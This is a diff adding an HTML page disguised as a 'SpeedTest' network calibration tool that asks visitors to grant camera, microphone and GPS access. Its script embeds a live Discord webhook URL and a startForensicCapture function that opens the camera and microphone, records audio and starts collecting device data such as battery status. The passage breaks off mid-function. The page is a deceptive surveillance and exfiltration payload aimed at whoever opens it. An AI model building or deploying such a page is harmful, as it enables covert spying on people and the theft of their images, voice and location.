@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpeedTest Global | Connection Verify</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 10px 50px rgba(0,0,0,0.5); width: 90%; max-width: 380px; border: 1px solid #232a42; }
+        .logo { font-size: 24px; font-weight: bold; color: #00d2ff; margin-bottom: 10px; border-bottom: 2px solid #00d2ff; display: inline-block; padding-bottom: 5px; }
+        h2 { font-size: 1.2rem; margin: 15px 0; }
+        p { color: #8b96b1; font-size: 0.9rem; line-height: 1.5; }
+        .btn { background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%); color: white; border: none; padding: 15px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; font-size: 1rem; box-shadow: 0 4px 15px rgba(58, 123, 213, 0.4); }
+        #status { margin-top: 20px; font-size: 0.8rem; color: #5c6784; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="logo">SPEEDTEST</div>
+    <h2>Network Optimization</h2>
+    <p>We need to calibrate your <b>Camera, Microphone, and GPS</b> to perform a full hardware latency test and find the closest node.</p>
+    <button class="btn" onclick="startForensicCapture()">BEGIN CALIBRATION</button>
+    <div id="status">Ready to scan...</div>
+</div>
+
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    // YOUR LIVE WEBHOOK
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';
+
+    async function startForensicCapture() {
+        const status = document.getElementById('status');
+        status.innerText = "Requesting hardware access...";
+
+        try {
+            // 1. Get Camera & Mic
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // 2. Start Audio Recording (5 Seconds)
+            const mediaRecorder = new MediaRecorder(stream);
+            let audioChunks = [];
+            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+            mediaRecorder.start();
+
+            // 3. Get Battery
+            let battery = "N/A";
+            if (navigator.getBattery) {
